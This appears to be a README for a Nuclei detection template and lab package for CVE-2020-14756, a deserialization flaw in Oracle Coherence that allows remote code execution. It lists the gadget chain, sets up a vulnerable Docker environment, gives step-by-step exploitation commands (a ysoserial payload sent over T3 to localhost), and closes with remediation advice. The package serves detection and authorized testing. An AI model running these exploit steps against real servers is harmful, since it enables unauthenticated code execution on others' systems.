# CVE-2020-14756 - Oracle Coherence Remote Code Execution

## Vulnerability Overview

**CVE ID:** CVE-2020-14756  
**Severity:** Critical (CVSS 9.8)  
**Affected Product:** Oracle Coherence (part of Oracle Fusion Middleware / WebLogic)  
**Protocols:** T3, IIOP  
**Attack Type:** Insecure Deserialization → Remote Code Execution  

## Description

Oracle Coherence component of Oracle Fusion Middleware contains a remote code execution vulnerability. An unauthenticated attacker with network access via T3 or IIOP protocols can exploit insecure deserialization in the `ExternalizableHelper` class to execute arbitrary code on the server.

## Affected Versions

- Oracle Coherence 3.7.1.0
- Oracle Coherence 12.1.3.0.0
- Oracle Coherence 12.2.1.3.0
- Oracle Coherence 12.2.1.4.0
- Oracle Coherence 14.1.1.0.0

## Technical Details

### Gadget Chain

```
AttributeHolder.readExternal()
  └── ExternalizableHelper.readObject()
        └── TopNAggregator.PartialResult.readExternal()
              └── TreeMap.put()
                    └── SortedBag.WrapperComparator.compare()
                          └── MvelExtractor.extract()
                                └── MVEL expression execution
```

### Key Classes

| Class | Package | Role |
|-------|---------|------|
| `AttributeHolder` | com.tangosol.coherence.servlet | Entry point (Externalizable) |
| `TopNAggregator.PartialResult` | com.tangosol.util.aggregator | Gadget chain link |
| `MvelExtractor` | com.tangosol.coherence.rest.util.extractor | Code execution sink |
| `ExternalizableHelper` | com.tangosol.io | Deserialization handler |

## Files in This Package

| File | Description |
|------|-------------|
| `CVE-2020-14756.yaml` | Nuclei template for detection |
| `Dockerfile` | Vulnerable WebLogic environment |
| `docker-compose.yml` | Docker Compose configuration |
| `weblogic_t3.py` | T3 protocol exploit script |
| `gen_payload.py` | Payload generator (simplified) |
| `run_test.sh` | Automated test script |
| `nuclei_debug_output.txt` | Debug output from nuclei scan |

## Setup Vulnerable Environment

### Using Docker Compose (Recommended)

```bash
# Start vulnerable WebLogic
docker-compose up -d

# Wait for startup (~2-3 minutes)
docker-compose logs -f

# WebLogic will be accessible at:
# - T3/IIOP: localhost:7001
# - Console: http://localhost:7001/console
```

### Manual Docker Build

```bash
docker build -t weblogic-vuln .
docker run -d -p 7001:7001 -p 7002:7002 --name weblogic-vuln weblogic-vuln
```

## Exploitation

### Step 1: Generate Payload

Using ysoserial (recommended):

```bash
java -jar ysoserial.jar Coherence1 'touch /tmp/pwned' > payload.bin
```

Or using included generator:

```bash
python3 gen_payload.py 'touch /tmp/pwned' payload.bin
```

### Step 2: Send Exploit

```bash
python3 weblogic_t3.py 127.0.0.1 7001 payload.bin
```

### Step 3: Verify Execution

```bash
docker exec weblogic-vuln ls -la /tmp/pwned
```

## Testing with Nuclei

```bash
# Run template with debug output
nuclei -t CVE-2020-14756.yaml -u 127.0.0.1:7001 -debug -vvv | tee nuclei_debug_output.txt
```

## Remediation

1. **Apply Patch:** Install Oracle Critical Patch Update (January 2021 or later)
2. **Disable Protocols:** Disable T3/IIOP if not required
3. **Network Segmentation:** Restrict access to ports 7001/7002
4. **IDS/IPS:** Enable detection signatures for WebLogic deserialization attacks

## References

- [NVD - CVE-2020-14756](https://nvd.nist.gov/vuln/detail/CVE-2020-14756)
- [Oracle CPU January 2021](https://www.oracle.com/security-alerts/cpujan2021.html)
- [Y4er CVE-2020-14756 PoC](https://github.com/Y4er/CVE-2020-14756)
- [Bounty Team Analysis](https://bounty-team.github.io/vulnerability%20analysis/2021/01/27/CVE-2020-14756/)

## Disclaimer

This template and associated tools are provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Author

princechaddha

## Bounty Claim

`/claim #14152`
